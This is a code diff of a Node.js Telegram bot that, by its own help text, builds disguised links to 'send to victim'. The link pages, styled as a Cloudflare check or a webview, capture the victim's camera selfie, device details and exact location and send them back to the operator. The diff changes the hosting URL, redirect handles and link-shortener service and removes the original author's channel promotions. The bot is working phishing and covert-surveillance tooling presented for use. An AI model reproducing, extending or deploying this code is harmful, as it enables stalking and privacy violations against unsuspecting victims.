@@ -7,6 +7,8 @@ const TelegramBot = require('node-telegram-bot-api');
 const bot = new TelegramBot(process.env["bot"], {polling: true});
 var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
 var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
+
+
 const app = express();
 app.use(jsonParser);
 app.use(urlencodedParser);
@@ -14,7 +16,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL="https://mazaPhoneHackBot.mazadownload.repl.co";
+var hostURL="https://hostpoint-2.ashishyadav210.repl.co";
 //TOGGLE for 1pt Proxy and Shorters
 var use1pt=true;
 
@@ -30,7 +32,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/Mazadownload");
+res.redirect("@adi1.exe");
 }
 
          
@@ -48,7 +50,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/Mazadownload");
+res.redirect("@adi1.exe");
 }
 
          
@@ -71,14 +73,13 @@ var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou Can Use This Bot To Phone Hacking Bot People Just Through A Simple Link.\n\nIt Can Gather Informations Like Location , Device Info, Camera Snaps.\n\n If You using this bot make sure follow us Here @mazadownload\n\nJoin @MazaDownload for more tool.\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou Can Use This Bot To Camera Hacking Bot People Just Through A Simple Link.\n\nIt Can Gather Informations Like Location , Device Info, Camera Snaps.\n\n \n\nType /help for more info.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
 }
 else if(msg.text=="/help"){
 bot.sendMessage(chatId,`Click On Start Button Then Click On Create\n\nThen Send Any Website Link To Bot.\n\nThen Bot Send You Some Links Copy Any 1 Link And Send To Victim\n\nWhen Victim Open The Link Then You Will Get His Selfie, Mobile Info & If His Mobile Location Is On Then You Will Get His Exact Location Of Google Maps\n\n(⚠️ Many Sites May Not Work Under This Method If They Have X-frame Header Present.Ex https://google.com)
-\n\nJoin Telegram Channel: https://t.me/Mazadownload
 `);
 }
   
@@ -115,27 +116,27 @@ var m={
 
 var cUrl=`${hostURL}/c/${url}`;
 var wUrl=`${hostURL}/w/${url}`;
+
   
 bot.sendChatAction(cid,"typing");
 if(use1pt){
-var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
-var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
-
+var x=await fetch(`https://short.glasscss.repl.co/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
+var y=await fetch(`https://short.glasscss.repl.co/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
 var f="",g="";
-
 for(var c in x){
 f+=x[c]+"\n";
 }
-
 for(var c in y){
 g+=y[c]+"\n";
 }
+
+
   
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\n\nURL: ${msg}\n\n💢 Join Telegram Channel @MazaDownload\n\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
+bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\n\nURL: ${msg}\n\n\n\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
 }
 else{
 
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\n\nURL: ${msg}\n\n💢 Join Telegram Channel @MazaDownload\n\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
+bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\n\nURL: ${msg}\n\n\n\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
 }
 }
 else{
